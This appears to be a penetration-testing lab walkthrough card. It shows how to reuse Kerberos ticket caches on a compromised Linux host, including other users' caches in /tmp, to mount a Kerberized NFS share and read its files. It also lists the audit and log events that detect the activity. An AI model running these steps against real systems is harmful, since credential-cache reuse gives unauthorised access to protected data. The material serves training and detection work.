# WT#047 — NFS Kerberos Mount Abuse

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.40 (linux01) |
| **Domain** | cadre.local |
| **Starting Credential** | Post-compromise with Kerberos ticket cache |
| **Tools Required** | mount, klist |
| **Certifications** | CAPE |
| **MITRE ATT&CK** | T1021.002, T1557 |
| **Difficulty** | Medium |

## Prerequisites
- Shell access on linux01 with a valid Kerberos TGT
- NFS export `/exports/secure-share` configured with `sec=krb5p`
- Local mount directory exists or can be created

## Attack Steps

### 1. Verify Kerberos ticket availability
```bash
klist
sudo klist -c /tmp/krb5cc_*
export KRB5CCNAME=/tmp/krb5cc_<UID>
```

### 2. Examine NFS exports
```bash
showmount -e localhost
```

### 3. Create mount point and mount with Kerberos auth
```bash
sudo mkdir -p /mnt/nfs-secure
sudo mount -t nfs -o sec=krb5p localhost:/exports/secure-share /mnt/nfs-secure
```

### 4. Access protected share contents
```bash
ls -la /mnt/nfs-secure/
cat /mnt/nfs-secure/sensitive_data.txt
```

### 5. Clean up mount
```bash
sudo umount /mnt/nfs-secure
```

## Post-Exploitation Chain
Valid Kerberos TGT → Kerberized NFS mount (sec=krb5p) → Access to encrypted NFS share contents

## Telemetry Verification
- **auditd key `nfs_mount`**: Mount syscall with Kerberos security flavor
- **Event 4768**: Kerberos TGT used for NFS service ticket
- **System log (/var/log/syslog)**: NFS mount operation logs

## Status
CONFIGURED
